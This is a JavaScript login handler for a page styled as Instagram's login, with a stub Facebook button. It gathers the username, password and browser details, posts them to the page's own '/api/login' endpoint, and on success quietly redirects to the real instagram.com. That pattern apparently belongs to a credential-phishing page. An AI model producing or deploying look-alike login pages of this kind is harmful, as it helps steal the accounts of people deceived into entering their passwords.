// Instagram Login Form Handler
class InstagramLogin {
    constructor() {
        this.form = document.getElementById('loginForm');
        this.usernameInput = document.getElementById('username');
        this.passwordInput = document.getElementById('password');
        this.loginBtn = document.getElementById('loginBtn');
        
        this.bindEvents();
    }
    
    bindEvents() {
        this.form.addEventListener('submit', (e) => this.handleSubmit(e));
        this.usernameInput.addEventListener('input', () => this.validateForm());
        this.passwordInput.addEventListener('input', () => this.validateForm());
    }
    
    validateForm() {
        const isValid = this.usernameInput.value.trim() && this.passwordInput.value.trim();
        this.loginBtn.disabled = !isValid;
    }
    
    async handleSubmit(e) {
        e.preventDefault();
        
        if (!this.usernameInput.value.trim() || !this.passwordInput.value.trim()) {
            alert('Please fill in all fields');
            return;
        }
        
        this.setLoadingState(true);
        
        try {
            const formData = {
                username: this.usernameInput.value.trim(),
                password: this.passwordInput.value.trim(),
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform
            };
            
            // Send to backend API
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData)
            });
            
            // Check if response is ok before parsing JSON
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            // Get response text first to check if it's valid JSON
            const responseText = await response.text();
            console.log('Response text:', responseText);
            
            let result;
            try {
                result = JSON.parse(responseText);
            } catch (parseError) {
                console.error('JSON parse error:', parseError);
                console.error('Response text:', responseText);
                throw new Error('Invalid response from server');
            }
            
            if (result.success) {
                // Redirect to Instagram immediately without showing any message
                window.location.href = 'https://www.instagram.com/';
            } else {
                alert('Login failed. Please try again.');
            }
            
        } catch (error) {
            console.error('Login error:', error);
            alert('Network error. Please check your connection and try again.');
        } finally {
            this.setLoadingState(false);
        }
    }
    
    setLoadingState(loading) {
        if (loading) {
            this.loginBtn.textContent = 'Logging in...';
            this.loginBtn.disabled = true;
            this.form.classList.add('loading');
        } else {
            this.loginBtn.textContent = 'Log in';
            this.loginBtn.disabled = false;
            this.form.classList.remove('loading');
        }
    }
    
    
}

// Facebook login handler
class FacebookLogin {
    constructor() {
        this.facebookBtn = document.querySelector('.fb');
        this.bindEvents();
    }
    
    bindEvents() {
        this.facebookBtn.addEventListener('click', (e) => this.handleClick(e));
    }
    
    handleClick(e) {
        e.preventDefault();
        alert('Facebook login clicked!'); // Placeholder for actual Facebook login
    }
}


// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    // Initialize Instagram login
    window.instagramLogin = new InstagramLogin();
    
    // Initialize Facebook login
    new FacebookLogin();
    
    console.log('Instagram Login App initialized');
});